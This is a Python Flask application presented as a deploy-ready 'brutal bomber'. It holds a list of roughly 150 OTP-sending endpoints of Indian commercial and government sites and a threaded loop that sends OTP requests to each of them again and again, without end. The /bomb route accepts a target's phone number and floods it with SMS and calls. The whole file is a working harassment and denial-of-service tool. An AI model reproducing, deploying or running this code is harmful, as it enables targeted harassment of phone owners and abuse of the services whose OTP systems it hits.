# ============================================
# brutal_bomber_part2_render.py
# Render Deploy Ready — Remaining APIs Only
# ============================================

from flask import Flask, request, jsonify
import requests
import json
import time
import random
import sys
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

app = Flask(__name__)

# ====== GLOBAL VARIABLES ======
running = True
success_lock = Lock()
failed_lock = Lock()
bomber_instance = None

def signal_handler(sig, frame):
    global running
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ====== PART 2 APIS (REMAINING — NO ULTRA / NO PART 1) ======
PART2_APIS = [
    # ==== E-COMMERCE (Remaining) ====
    {"name": "Limeroad_SMS", "url": "https://www.limeroad.com/api/v1/otp/send", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Limeroad_Call", "url": "https://limeroad.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Shopclues_SMS", "url": "https://www.shopclues.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Shopclues_Call", "url": "https://shopclues.com/v1/user/otplogin", "method": "POST", "payload": {"phoneNumber": "{num}"}},
    {"name": "TataCliq_SMS", "url": "https://www.tatacliq.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "TataCliq_Call", "url": "https://tatacliq.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Purplle_SMS", "url": "https://www.purplle.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Purplle_Call", "url": "https://purplle.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Bewakoof_SMS", "url": "https://www.bewakoof.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Bewakoof_Call", "url": "https://bewakoof.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "SouledStore_SMS", "url": "https://www.thesouledstore.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "SouledStore_Call", "url": "https://thesouledstore.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Zivame_SMS", "url": "https://www.zivame.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Zivame_Call", "url": "https://zivame.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Clovia_SMS", "url": "https://www.clovia.com/api/v4/signup/check-existing-user", "method": "GET", "params": {"mobile": "{num}"}},
    {"name": "Clovia_Call", "url": "https://clovia.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "PaytmMall_SMS", "url": "https://paytmmall.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "PaytmMall_Call", "url": "https://paytmmall.com/gw/login-register/v1/sendOTP", "method": "POST", "payload": {"phone": "{num}"}},
    
    # ==== FOOD & DELIVERY (Remaining) ====
    {"name": "McDonalds_SMS", "url": "https://www.mcdelivery.co.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "McDonalds_Call", "url": "https://mcdelivery.in/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "BurgerKing_SMS", "url": "https://www.burgerking.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "BurgerKing_Call", "url": "https://burgerking.in/gw/login-register/v1/sendOTP", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "KFC_SMS", "url": "https://www.kfc.co.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "KFC_Call", "url": "https://kfc.co.in/v1/user/otplogin", "method": "POST", "payload": {"phoneNumber": "{num}"}},
    {"name": "Dunzo_SMS", "url": "https://www.dunzo.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Dunzo_Call", "url": "https://dunzo.com/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Milkbasket_SMS", "url": "https://www.milkbasket.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Milkbasket_Call", "url": "https://milkbasket.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Freshtohome_SMS", "url": "https://www.freshtohome.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Freshtohome_Call", "url": "https://freshtohome.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Godrej_SMS", "url": "https://www.godrejnaturesbasket.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Godrej_Call", "url": "https://godrejnaturesbasket.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    
    # ==== TRAVEL & TRANSPORT (Remaining) ====
    {"name": "Cleartrip_SMS", "url": "https://www.cleartrip.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Cleartrip_Call", "url": "https://cleartrip.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "EaseMyTrip_SMS", "url": "https://www.easemytrip.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "EaseMyTrip_Call", "url": "https://easemytrip.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Ixigo_SMS", "url": "https://www.ixigo.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Ixigo_Call", "url": "https://ixigo.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "MeruCabs_SMS", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "payload": {"mobile_number": "{num}"}},
    {"name": "MeruCabs_Call", "url": "https://merucabapp.com/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Treebo_SMS", "url": "https://www.treebo.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Treebo_Call", "url": "https://treebo.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    
    # ==== FINANCE & BANKING (Remaining) ====
    {"name": "FreeCharge_SMS", "url": "https://www.freecharge.in/api/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "FreeCharge_Call", "url": "https://freecharge.in/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Paytm_Bank_SMS", "url": "https://www.paytmbank.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Paytm_Bank_Call", "url": "https://paytmbank.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "OlaMoney_SMS", "url": "https://www.olamoney.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "OlaMoney_Call", "url": "https://olamoney.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "BHIM_SMS", "url": "https://www.bhim.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "BHIM_Call", "url": "https://bhim.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phoneNumber": "{num}"}},
    
    # ==== HEALTH & MEDICINE (Remaining) ====
    {"name": "Apollo247_SMS", "url": "https://www.apollo247.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Apollo247_Call", "url": "https://apollo247.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "MFine_SMS", "url": "https://www.mfine.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "MFine_Call", "url": "https://mfine.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "DocsApp_SMS", "url": "https://www.docsapp.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "DocsApp_Call", "url": "https://docsapp.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Lybrate_SMS", "url": "https://www.lybrate.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Lybrate_Call", "url": "https://lybrate.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Portea_SMS", "url": "https://www.portea.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Portea_Call", "url": "https://portea.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    
    # ==== EDUCATION (Remaining) ====
    {"name": "Toppr_SMS", "url": "https://www.toppr.com/api/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Toppr_Call", "url": "https://toppr.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "WhiteHatJr_SMS", "url": "https://www.whitehatjr.com/api/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "WhiteHatJr_Call", "url": "https://whitehatjr.com/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "UpGrad_SMS", "url": "https://www.upgrad.com/api/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "UpGrad_Call", "url": "https://upgrad.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    
    # ==== REAL ESTATE (Remaining) ====
    {"name": "99acres_SMS", "url": "https://www.99acres.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "99acres_Call", "url": "https://99acres.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "CommonFloor_SMS", "url": "https://www.commonfloor.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "CommonFloor_Call", "url": "https://commonfloor.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "SquareYards_SMS", "url": "https://www.squareyards.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "SquareYards_Call", "url": "https://squareyards.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    
    # ==== GAMING (Remaining) ====
    {"name": "RummyCircle_SMS", "url": "https://www.rummycircle.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "RummyCircle_Call", "url": "https://rummycircle.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Adda52_SMS", "url": "https://www.adda52.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Adda52_Call", "url": "https://adda52.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    
    # ==== JOB & PROFESSIONAL (Remaining) ====
    {"name": "Shine_SMS", "url": "https://www.shine.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Shine_Call", "url": "https://shine.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Monster_SMS", "url": "https://www.monster.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Monster_Call", "url": "https://monster.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "TimesJobs_SMS", "url": "https://www.timesjobs.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "TimesJobs_Call", "url": "https://timesjobs.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Freshersworld_SMS", "url": "https://www.freshersworld.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Freshersworld_Call", "url": "https://freshersworld.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Upwork_SMS", "url": "https://www.upwork.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Upwork_Call", "url": "https://upwork.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Fiverr_SMS", "url": "https://www.fiverr.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Fiverr_Call", "url": "https://fiverr.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Freelancer_SMS", "url": "https://www.freelancer.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Freelancer_Call", "url": "https://freelancer.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Toptal_SMS", "url": "https://www.toptal.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Toptal_Call", "url": "https://toptal.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    
    # ==== INSURANCE (Remaining) ====
    {"name": "PolicyBazaar_SMS", "url": "https://www.policybazaar.com/api/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "PolicyBazaar_Call", "url": "https://policybazaar.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Coverfox_SMS", "url": "https://www.coverfox.com/api/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Coverfox_Call", "url": "https://coverfox.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Acko_SMS", "url": "https://www.acko.com/api/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Acko_Call", "url": "https://acko.com/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "GoDigit_SMS", "url": "https://www.godigit.com/api/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "GoDigit_Call", "url": "https://godigit.com/api/v2/login/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "StarHealth_SMS", "url": "https://www.starhealth.in/api/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "StarHealth_Call", "url": "https://starhealth.in/api/v2/auth/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "MaxBupa_SMS", "url": "https://www.maxbupa.com/api/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "MaxBupa_Call", "url": "https://maxbupa.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    
    # ==== GOVERNMENT (Remaining) ====
    {"name": "VoterID_SMS", "url": "https://www.nvsp.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "VoterID_Call", "url": "https://nvsp.in/gw/login-register/v1/sendOTP", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Aadhaar_SMS", "url": "https://uidai.gov.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Aadhaar_Call", "url": "https://uidai.gov.in/api/v1/voice-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "PAN_SMS", "url": "https://www.protean-tinpan.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "PAN_Call", "url": "https://protean-tinpan.com/api/v1/voice-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "DrivingLicense_SMS", "url": "https://parivahan.gov.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "DrivingLicense_Call", "url": "https://parivahan.gov.in/api/v1/voice-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "VehicleReg_SMS", "url": "https://vahan.parivahan.gov.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "VehicleReg_Call", "url": "https://vahan.parivahan.gov.in/api/v1/voice-otp", "method": "POST", "payload": {"phone": "{num}"}},
    
    # ==== ENTERTAINMENT (Remaining) ====
    {"name": "ZEE5_SMS", "url": "https://www.zee5.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "ZEE5_Call", "url": "https://zee5.com/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "JioCinema_SMS", "url": "https://www.jiocinema.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "JioCinema_Call", "url": "https://jiocinema.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Voot_SMS", "url": "https://www.voot.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Voot_Call", "url": "https://voot.com/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "MXPlayer_SMS", "url": "https://www.mxplayer.in/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "MXPlayer_Call", "url": "https://mxplayer.in/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "ALTBalaji_SMS", "url": "https://www.altbalaji.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "ALTBalaji_Call", "url": "https://altbalaji.com/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Spotify_SMS", "url": "https://www.spotify.com/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Spotify_Call", "url": "https://spotify.com/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Gaana_SMS", "url": "https://www.gaana.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "Gaana_Call", "url": "https://gaana.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Wynk_SMS", "url": "https://www.wynk.in/api/v1/otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "Wynk_Call", "url": "https://wynk.in/api/v2/auth/send-otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "JioSaavn_SMS", "url": "https://www.jiosaavn.com/api/v1/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "JioSaavn_Call", "url": "https://jiosaavn.com/api/v2/login/sendotp", "method": "POST", "payload": {"phone": "{num}"}},
]

# ====== REMOVE DUPLICATES ======
seen = set()
UNIQUE_APIS = []
for api in PART2_APIS:
    key = (api["name"], api["url"])
    if key not in seen:
        seen.add(key)
        UNIQUE_APIS.append(api)

print(f"✅ PART 2 — Total APIs Loaded: {len(UNIQUE_APIS)}")

# ====== BOMBER CLASS ======
class BrutalBomber:
    def __init__(self, number, threads=50, delay=0.005):
        self.number = number
        self.threads = threads
        self.delay = delay
        self.success = 0
        self.failed = 0
        self.api_stats = {}
        self.start_time = time.time()
        self.session = requests.Session()
        self.running = True
    
    def _send(self, api):
        if not self.running:
            return False
        
        time.sleep(self.delay)
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json"
            }
            
            url = api["url"]
            if "{num}" in url:
                url = url.replace("{num}", self.number)
            
            payload = {}
            if "payload" in api:
                for key, value in api["payload"].items():
                    if isinstance(value, str) and "{num}" in value:
                        payload[key] = value.replace("{num}", self.number)
                    else:
                        payload[key] = value
            
            if "params" in api:
                params = {}
                for key, value in api["params"].items():
                    if isinstance(value, str) and "{num}" in value:
                        params[key] = value.replace("{num}", self.number)
                    else:
                        params[key] = value
                resp = self.session.get(url, params=params, headers=headers, timeout=5)
            elif api.get("method", "POST").upper() == "POST":
                resp = self.session.post(url, json=payload, headers=headers, timeout=5)
            else:
                resp = self.session.get(url, params=payload, headers=headers, timeout=5)
            
            if resp.status_code in [200, 201, 202, 204]:
                with success_lock:
                    self.success += 1
                self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) + 1
                return True
            with failed_lock:
                self.failed += 1
            self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) - 1
            return False
        except:
            with failed_lock:
                self.failed += 1
            self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) - 1
            return False
    
    def start(self):
        self.running = True
        print("\n" + "="*60)
        print("🔥 PART 2 — BRUTAL BOMBER (Render) 🔥")
        print("="*60)
        print(f"📱 Target: {self.number}")
        print(f"🧵 Threads: {self.threads}")
        print(f"⏱️  Delay: {self.delay} sec")
        print(f"📡 APIs: {len(UNIQUE_APIS)}")
        print("="*60)
        print("💀 INFINITY BOMBING STARTED!")
        print("🛑 CTRL+C to stop\n")
        
        cycle = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while self.running:
                cycle += 1
                futures = [executor.submit(self._send, api) for api in UNIQUE_APIS]
                for future in as_completed(futures):
                    if not self.running:
                        break
                    future.result()
                
                elapsed = int(time.time() - self.start_time)
                rate = self.success / elapsed if elapsed > 0 else 0
                print(f"🔄 Cycle {cycle} | ✅ {self.success} | ❌ {self.failed} | ⚡ {rate:.1f} SMS/sec")
        
        elapsed = int(time.time() - self.start_time)
        print("\n" + "="*60)
        print("📊 FINAL REPORT")
        print("="*60)
        print(f"⏱️  Time: {elapsed}s")
        print(f"✅ SMS: {self.success}")
        print(f"❌ Failed: {self.failed}")
        print(f"⚡ Speed: {self.success/elapsed:.1f} SMS/sec" if elapsed > 0 else "")
        print("\n🏆 TOP APIS:")
        for name, score in sorted(self.api_stats.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"   {'✅' if score > 0 else '❌'} {name}: {score}")
        print("="*60)
        return {
            "target": self.number,
            "total_apis": len(UNIQUE_APIS),
            "successful": self.success,
            "failed": self.failed,
            "speed": f"{self.success/elapsed:.1f} SMS/sec" if elapsed > 0 else "N/A",
            "time": f"{elapsed}s"
        }
    
    def stop(self):
        self.running = False

# ====== FLASK API ======
@app.route('/')
def home():
    return {
        "status": "🔥 PART 2 — BRUTAL BOMBER API 🔥",
        "version": "2.0",
        "total_apis": len(UNIQUE_APIS),
        "endpoints": {
            "/bomb": "POST/GET with phone parameter",
            "/health": "Health check for Uptime Robot",
            "/stop": "Stop bombing",
            "/stats": "API stats"
        }
    }

@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    global bomber_instance
    
    if request.method == 'GET':
        phone = request.args.get('phone')
        threads = int(request.args.get('threads', 50))
        delay = float(request.args.get('delay', 0.005))
    else:
        data = request.get_json() or {}
        phone = data.get('phone')
        threads = data.get('threads', 50)
        delay = data.get('delay', 0.005)
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"status": "error", "message": "Phone number must be 10 digits"}), 400
    
    bomber_instance = BrutalBomber(phone, threads, delay)
    result = bomber_instance.start()
    return jsonify({"status": "success", "result": result})

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "uptime": "100%",
        "version": "2.0",
        "total_apis": len(UNIQUE_APIS),
        "threads": 50,
        "delay": "0.005s",
        "mode": "infinite_loop",
        "source": "PART 2 — Remaining APIs Only"
    })

@app.route('/stop')
def stop():
    global bomber_instance
    if bomber_instance:
        bomber_instance.stop()
        return jsonify({"status": "stopped", "message": "Bombing stopped successfully"})
    return jsonify({"status": "error", "message": "No active bombing session"})

@app.route('/stats')
def stats():
    return jsonify({
        "total_apis": len(UNIQUE_APIS),
        "threads": 50,
        "delay": "0.005s",
        "mode": "infinite_loop",
        "source": "PART 2 — Remaining APIs Only"
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)